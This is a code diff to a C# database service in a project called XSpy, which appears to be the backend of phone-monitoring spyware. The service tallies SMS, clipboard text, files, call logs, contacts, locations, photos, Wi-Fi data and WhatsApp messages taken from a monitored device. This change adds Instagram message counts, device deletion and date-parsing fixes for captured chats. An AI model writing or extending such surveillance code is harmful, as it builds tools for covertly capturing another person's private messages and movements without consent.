@@ -33,6 +33,10 @@ namespace XSpy.Database.Services
 
         public async Task<DeviceMenuViewModel> GetDashboardInfo(Guid deviceId)
         {
+            var device =await DbContext.Devices.FirstOrDefaultAsync(s => s.Id == deviceId);
+            if (device == null)
+                return null;
+
             var sms = await DbContext.Messages.Where(s => s.DeviceId == deviceId).LongCountAsync();
             var words = await DbContext.Clipboards.Where(s => s.DeviceId == deviceId).LongCountAsync();
             var files = await DbContext.Files.Where(s => s.DeviceId == deviceId && s.FileType != "audio")
@@ -47,19 +51,23 @@ namespace XSpy.Database.Services
             var whatsapp = await DbContext.AppMessages
                 .Where(s => s.DeviceId == deviceId && s.AppType == AppType.WhatsApp).LongCountAsync();
 
+            var insta = await DbContext.AppMessages
+                .Where(s => s.DeviceId == deviceId && s.AppType == AppType.Instagram).LongCountAsync();
+
             return new DeviceMenuViewModel()
             {
                 Files = files,
                 Messages = sms,
                 Words = words,
                 Audios = audios,
-                BatteryLevel = 100,
+                Instagram = insta,
                 Contacts = contacts,
                 Calls = calls,
                 Locations = locations,
                 Photos = images,
                 WhatsApp = whatsapp,
-                WifiCount = wifi
+                WifiCount = wifi,
+                Device = device
             };
         }
 
@@ -116,6 +124,12 @@ namespace XSpy.Database.Services
             return DbContext.AppContacts.Where(s => s.AppType == appType && s.DeviceId == device.Id).ToListAsync();
         }
 
+        public async Task Delete(Device device)
+        {
+            DbContext.Devices.Remove(device);
+            await DbContext.SaveChangesAsync();
+        }
+
         public Task<Device> GetDeviceById(Guid id, Guid userId)
         {
             return DbContext.Devices.FirstOrDefaultAsync(s => s.Id == id && s.UserId == userId);
@@ -158,6 +172,12 @@ namespace XSpy.Database.Services
             device.IsOnline = false;
             DbContext.Update(device);
             await DbContext.SaveChangesAsync();
+        }
+
+        public Task<long> GetDeviceCount(Guid userId, SaveDeviceRequest request)
+        {
+            return DbContext.Devices.Where(s => s.UserId == userId && s.DeviceId != request.DeviceId)
+                .LongCountAsync();
         }
 
         public async Task SaveDevice(Guid userId, SaveDeviceRequest request)
@@ -462,13 +482,13 @@ namespace XSpy.Database.Services
                         default:
                             if (date.Contains("."))
                             {
-
-                                day = date.Remove(date.Length- 6, 6);
+                                day = date.Remove(date.Length - 6, 6);
 
                                 if (day.Contains("de "))
                                 {
                                     day = day.Replace("de ", null);
                                 }
+
                                 return DateTime.Parse(day);
                             }
 
@@ -527,7 +547,8 @@ namespace XSpy.Database.Services
                 var time = DateTime.Parse(messageRequest.Time);
 
 
-                var dateTime = DateTime.Parse(date.ToString("dd/MM/yyyy " + time.ToString("HH:mm:ss")));
+                var dateTime = DateTime.ParseExact(date.ToString("dd/MM/yyyy " + time.ToString("HH:mm:ss")),
+                    "dd/MM/yyyy HH:mm:ss", null);
 
                 if (await DbContext.AppMessages.AnyAsync(s =>
                     s.Body == messageRequest.Message && s.MessageDate == dateTime && s.IsOwn == messageRequest.IsOwn))
